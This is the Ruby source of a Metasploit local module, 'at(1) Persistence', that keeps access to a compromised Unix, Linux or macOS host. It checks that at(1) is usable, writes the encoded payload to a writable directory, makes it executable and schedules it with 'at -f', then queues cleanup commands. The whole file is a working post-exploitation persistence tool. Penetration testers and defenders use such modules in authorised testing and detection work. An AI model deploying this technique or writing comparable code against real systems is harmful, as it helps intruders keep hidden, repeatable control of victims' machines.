##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Persistence
  include Msf::Exploit::Local::Timespec
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Deprecated
  moved_from 'exploits/unix/local/at_persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'at(1) Persistence',
        'Description' => %q{
          This module achieves persistence by executing payloads via at(1).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jon Hart <jon_hart@rapid7.com>'
        ],
        'Targets' => [['Automatic', {} ]],
        'DefaultTarget' => 0,
        'Platform' => %w[unix linux osx],
        'Arch' => ARCH_CMD,
        'SessionTypes' => ['meterpreter', 'shell'],
        'DisclosureDate' => '1997-01-01', # http://pubs.opengroup.org/onlinepubs/007908799/xcu/at.html
        'References' => [
          ['URL', 'https://linux.die.net/man/1/at'],
          ['URL', 'https://www.geeksforgeeks.org/at-command-in-linux-with-examples/'],
          ['URL', 'https://attack.mitre.org/techniques/T1053/002/'],
        ],
        'Notes' => {
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TIME', [false, 'When to run job via at(1). See timespec', 'now'])
    ])
  end

  def check
    return CheckCode::Safe("#{datastore['WritableDir']} does not exist") unless exists? datastore['WritableDir']
    return CheckCode::Safe("#{datastore['WritableDir']} not writable") unless writable? datastore['WritableDir']

    return CheckCode::Safe('at(1) not found on system') unless command_exists? 'at'

    # we do a direct test with atq instead of reading at.allow and at.deny
    token = Rex::Text.rand_text_alphanumeric(8)
    if cmd_exec("atq && echo #{token}").include?(token)
      return CheckCode::Vulnerable('at(1) confirmed to be usable as a persistence mechanism')
    end

    CheckCode::Safe('at(1) not usable as a persistence mechanism likely due to explicit permissions in at.allow or at.deny')
  end

  def install_persistence
    fail_with(Failure::BadConfig, "TIME option isn't valid timespec") unless Msf::Exploit::Local::Timespec.valid_timespec?(datastore['TIME'])
    payload_file = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(7..12)}"
    vprint_status("Writing payload to #{payload_file}")
    write_file(payload_file, payload.encoded)
    @clean_up_rc << "rm #{payload_file}\n"

    chmod(payload_file, 0o700)
    job = cmd_exec("at -f #{payload_file} #{datastore['TIME']}")
    job_id = job.split(' ')[1]
    print_good("at job created with id: #{job_id}")
    @clean_up_rc << "atrm #{job_id}\n"

    print_status("Waiting up to #{datastore['WfsDelay']}sec for execution")
  end
end
